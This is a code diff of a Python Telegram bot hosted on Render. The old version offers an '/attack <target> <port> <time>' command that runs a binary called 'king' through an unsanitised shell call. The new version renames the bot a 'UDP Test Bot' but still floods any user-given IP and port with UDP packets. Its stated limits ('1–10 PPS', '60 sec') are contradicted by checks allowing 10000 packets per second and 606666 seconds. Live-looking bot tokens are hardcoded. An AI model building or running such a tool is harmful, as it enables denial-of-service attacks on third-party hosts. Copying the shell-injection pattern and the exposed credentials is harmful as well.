@@ -1,65 +1,128 @@
-#!/usr/bin/python3
-import telebot
-import subprocess
-import os
+#!/usr/bin/env python3
+import socket
 import time
+import threading
+import ipaddress
 from flask import Flask
-from threading import Thread
+import telebot
 
-# --- CONFIGURATION ---
-TOKEN = '8435736634:AAEjqwKep8bh9dZmVyOhiI4CX4IE666_GIw'
+# ===== CONFIG =====
+TOKEN = "8435736634:AAHht4_qXrW16W9pDLNv3Feb8F3nvrK4G5g"   # ⚠️ replace this
 bot = telebot.TeleBot(TOKEN)
 
-# --- DUMMY SERVER FOR RENDER HEALTH CHECK ---
-app = Flask('')
+# ===== WEB SERVER (RENDER) =====
+app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "Bot is Running!"
+    return "Bot Running ✅"
 
-def run():
-    app.run(host='0.0.0.0', port=8080)
+def run_web():
+    app.run(host="0.0.0.0", port=8080)
 
-# --- BOT COMMANDS ---
+# ===== STATE =====
+active_users = {}
 
+# ===== TEST FUNCTION =====
+def run_test(chat_id, ip, port, duration, rate, msg_id):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(2)
+
+    packet = b"ping"
+    sent = 0
+    start = time.time()
+
+    try:
+        while time.time() - start < duration:
+            sock.sendto(packet, (ip, port))
+            sent += 1
+
+            if sent % max(1, int(rate * 2)) == 0:
+                try:
+                    bot.edit_message_text(
+                        f"🚀 Running...\n\nTarget: {ip}:{port}\nSent: {sent}",
+                        chat_id,
+                        msg_id
+                    )
+                except:
+                    pass
+
+            time.sleep(1 / rate)
+
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Error: {e}")
+
+    finally:
+        sock.close()
+        active_users.pop(chat_id, None)
+
+    bot.edit_message_text(
+        f"✅ Test Finished\n\nTarget: {ip}:{port}\nPackets: {sent}\nAvg PPS: {round(sent/duration,2)}",
+        chat_id,
+        msg_id
+    )
+
+# ===== COMMANDS =====
 @bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_name = message.from_user.first_name
-    bot.reply_to(message, f"🚀 Welcome {user_name}! Bot is active on Render.\nUse /attack to start.")
+def start(msg):
+    bot.send_message(
+        msg.chat.id,
+        "🤖 UDP Test Bot Ready\n\n"
+        "Use:\n/test <ip> <port> <time> <rate>\n\n"
+        "Example:\n"
+        "/test 127.0.0.1 7777 20 2"
+    )
 
-@bot.message_handler(commands=['attack'])
-def handle_attack(message):
-    command = message.text.split()
-    if len(command) == 4:
-        target, port, duration = command[1], command[2], command[3]
-        
-        # UI Response
-        username = message.from_user.first_name
-        bot.reply_to(message, f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🚀🚀\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {duration}s\n𝐌𝐞𝐭𝐡𝐨ᴅ: VIP KALA JADU")
+@bot.message_handler(commands=['test'])
+def test(msg):
+    try:
+        parts = msg.text.split()
 
-        # Binary Execution with Permissions
+        if len(parts) != 5:
+            bot.reply_to(msg, "❌ Usage:\n/test <ip> <port> <time> <rate>")
+            return
+
+        ip = parts[1]
+        port = int(parts[2])
+        duration = int(parts[3])
+        rate = float(parts[4])
+
+        # ===== VALIDATION =====
         try:
-            os.chmod("./king", 0o755) # Permission dena zaroori hai
-            full_command = f"./king {target} {port} {duration} 100"
-            subprocess.run(full_command, shell=True)
-            bot.send_message(message.chat.id, f"✅ Attack Finished on {target}:{port}")
-        except Exception as e:
-            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
-    else:
-        bot.reply_to(message, "✅ Usage: /attack <target> <port> <time>")
+            ipaddress.ip_address(ip)
+        except:
+            bot.reply_to(msg, "❌ Invalid IP")
+            return
 
-# --- DEPLOYMENT LOGIC ---
+        if rate <= 0 or rate > 10000:
+            bot.reply_to(msg, "⚠️ Rate: 1–10 PPS allowed")
+            return
+
+        if duration > 606666:
+            bot.reply_to(msg, "⚠️ Max duration = 60 sec")
+            return
+
+        if msg.chat.id in active_users:
+            bot.reply_to(msg, "⚠️ Test already running")
+            return
+
+        m = bot.send_message(msg.chat.id, f"🚀 Starting...\n\nTarget: {ip}:{port}")
+
+        active_users[msg.chat.id] = True
+
+        t = threading.Thread(
+            target=run_test,
+            args=(msg.chat.id, ip, port, duration, rate, m.message_id),
+            daemon=True
+        )
+        t.start()
+
+    except Exception as e:
+        bot.reply_to(msg, f"❌ Error: {e}")
+
+# ===== MAIN =====
 if __name__ == "__main__":
-    # 1. Start Web Server in Background (For Render)
-    t = Thread(target=run)
-    t.start()
-    
-    # 2. Start Bot Polling with Auto-Restart
-    print("Bot is starting on Render...")
-    while True:
-        try:
-            bot.polling(none_stop=True, interval=0, timeout=20)
-        except Exception as e:
-            print(f"Crash detected: {e}. Restarting...")
-            time.sleep(5)
-          
+    threading.Thread(target=run_web, daemon=True).start()
+
+    print("Bot running...")
+    bot.infinity_polling(skip_pending=True)
